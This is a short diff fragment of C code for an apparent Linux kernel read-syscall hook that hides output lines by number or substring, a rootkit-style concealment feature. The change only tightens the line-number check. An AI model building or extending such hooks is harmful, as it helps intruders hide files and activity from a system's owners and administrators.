@@ -60,7 +60,7 @@ asmlinkage long read_hook(const struct pt_regs *regs) {
         line_no++;
 
         // Hide line by number
-        if (rule->hide_line_with_number && line_no == rule->hide_line_with_number)
+        if (rule->hide_line_with_number > 0 && line_no == rule->hide_line_with_number)
             skip = true;
 
         // Hide line by substring
